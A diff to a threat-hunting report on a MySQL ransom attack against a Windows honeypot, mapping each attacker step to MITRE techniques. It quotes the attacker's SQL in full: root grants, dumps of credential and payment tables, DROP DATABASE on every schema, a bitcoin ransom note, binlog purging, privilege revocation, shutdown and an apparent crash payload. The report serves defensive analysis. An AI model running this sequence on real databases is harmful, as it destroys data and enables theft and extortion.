@@ -1,6 +1,5 @@
 # Incident Response & Threat Hunting Report: MySQL Extortion Campaign on Windows Honeypot
-
-**Author:** Gabriel Concepcion ([github.com/gabeconcepcion](https://github.com/gabeconcepcion))  
+ 
 **Target Asset:** `corp-tx-prl1` (Azure Windows 11 Enterprise VM)  
 **Incident ID:** `INC-2026-0817-MYSQL-RANSOM`  
 **Classification:** Database Ransomware / Data Exfiltration / Application-Layer Breach  
@@ -165,55 +164,59 @@ At **17:00:21 UTC on Aug 17, 2026**, IP address `64.89.163.176` connected to por
 ### Step 2: Privilege Escalation & Discovery (T1069.001 / T1087.002)
 The actor verified full administrative control across the database server, granting global creation and deletion rights to wildcard network root:
 ```sql
-[Thread 21] SHOW DATABASES
-[Thread 22] GRANT CREATE, DROP ON *.* TO `root`@`%`
-[Thread 26] SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
-[Thread 28] SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
-[Thread 53] SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'tx_corp_01'
-[Thread 58] SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
+SHOW DATABASES
+GRANT CREATE, DROP ON *.* TO `root`@`%`
+SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'recover_your_data'
+SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'sakila'
+SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'tx_corp_01'
+SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
 ```
 
 ### Step 3: Schema Exfiltration (T1005 / T1041)
 Between **17:00:33 UTC** and **17:01:01 UTC**, the adversary iterated over every table in all schemas. Most critically, corporate data in `tx_corp_01` was fully dumped:
 ```sql
-[Thread 53] USE `tx_corp_01`
-[Thread 53] SHOW tables
-[Thread 54] SELECT COLUMN_NAME, DATA_TYPE
-[Thread 54] SELECT * FROM `credentials`
-[Thread 55] SELECT COLUMN_NAME, DATA_TYPE
-[Thread 55] SELECT * FROM `customers`
-[Thread 56] SELECT COLUMN_NAME, DATA_TYPE
-[Thread 56] SELECT * FROM `orders`
-[Thread 57] SELECT COLUMN_NAME, DATA_TYPE
-[Thread 57] SELECT * FROM `payments`
+USE `tx_corp_01`
+SHOW tables
+SELECT COLUMN_NAME, DATA_TYPE
+SELECT * FROM `credentials`
+SELECT COLUMN_NAME, DATA_TYPE
+SELECT * FROM `customers`
+SELECT COLUMN_NAME, DATA_TYPE
+SELECT * FROM `orders`
+SELECT COLUMN_NAME, DATA_TYPE
+SELECT * FROM `payments`
 ```
+<img width="720" height="298" alt="image" src="https://github.com/user-attachments/assets/89ec7ac8-900e-43a0-a2a3-4db63241fb93" />
 
 ### Step 4: Schema Destruction & Ransom Inscription (T1485 / T1486)
 At **17:01:02 UTC**, all legitimate schemas were dropped in rapid succession and replaced with an extortion note:
 ```sql
-[Thread 62] DROP DATABASE `recover_your_data`
-[Thread 62] DROP DATABASE `sakila`
-[Thread 62] DROP DATABASE `tx_corp_01`
-[Thread 62] DROP DATABASE `world`
-[Thread 63] CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
-[Thread 63] USE RECOVER_YOUR_DATA
-[Thread 63] CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
-[Thread 63] INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0132 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')
-[Thread 63] INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2hxip@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2HXIP')
+DROP DATABASE 'recover_your_data'
+DROP DATABASE `sakila`
+DROP DATABASE `tx_corp_01`
+DROP DATABASE `world`
+CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
+USE RECOVER_YOUR_DATA
+CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
+INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0132 bitcoin to bc1q7jps5432akuflg9flw2vu6hgmmj5hrrdu6c5gm or in 48 hours, your data will be publicly disclosed and deleted. ')
+INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://bit.ly/22mysql) After payment send mail to ak+2hxip@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2HXIP')
 ```
+<img width="771" height="145" alt="image" src="https://github.com/user-attachments/assets/77f0fce6-fa0a-4d23-b5f3-73dd07338447" />
+
+<img width="1880" height="300" alt="image" src="https://github.com/user-attachments/assets/716a8c8c-41f4-4e6b-a61f-583b55a4e253" />
+
 
 ### Step 5: Anti-Forensics & Denial of Service (T1070.002 / T1499)
 To hinder recovery through MySQL binary log replay, the attacker purged all transactional binlogs, revoked root privileges to lock out administrators, and crashed the daemon:
 ```sql
-[Thread 64] RESET MASTER
-[Thread 65] SHOW MASTER STATUS
-[Thread 65] PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
-[Thread 66] REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'
-[Thread 67] GRANT SHUTDOWN ON *.* TO `root`@'%'
-[Thread 68] SHUTDOWN
-[Thread 69] SELECT JSON_SCHEMA_VALID('{"enum":[0]}', '"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"')
+RESET MASTER
+SHOW MASTER STATUS
+PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
+REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'
+GRANT SHUTDOWN ON *.* TO `root`@'%'
+SHUTDOWN
+SELECT JSON_SCHEMA_VALID('{"enum":[0]}', '"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"')
 ```
-
 ---
 
 ## 4. Digital Forensics & Differential Baseline Analysis
